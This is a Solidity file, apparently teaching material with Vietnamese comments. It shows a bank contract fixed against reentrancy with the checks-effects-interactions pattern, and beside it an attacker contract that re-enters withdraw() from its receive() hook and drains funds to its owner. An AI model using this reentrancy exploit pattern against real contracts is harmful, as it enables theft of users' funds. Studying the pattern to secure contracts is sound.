// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title VulnerableBankFixed - Ban va lo hong Reentrancy theo nguyen tac Checks-Effects-Interactions (CEI)
contract VulnerableBankFixed {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        // 1. CHECKS: Kiem tra dieu kien dau vao
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Khong co so du");
        
        // 2. EFFECTS: Cap nhat trang thai so sach noi bo TRUOC TIEN
        balances[msg.sender] = 0;
        
        // 3. INTERACTIONS: Chuyen tien that ra ben ngoai SAU CUNG
        (bool ok, ) = msg.sender.call{value: balance}("");
        require(ok, "Chuyen that bai");

        emit Withdraw(msg.sender, balance);
    }

    function bankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackerFixed {
    VulnerableBankFixed public bank;
    address public owner;

    constructor(address bankAddress) {
        bank = VulnerableBankFixed(bankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Can it nhat 1 ETH lam von");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdraw();
    }

    function collect() external {
        require(msg.sender == owner, "Khong phai chu");
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "Chuyen that bai");
    }
}
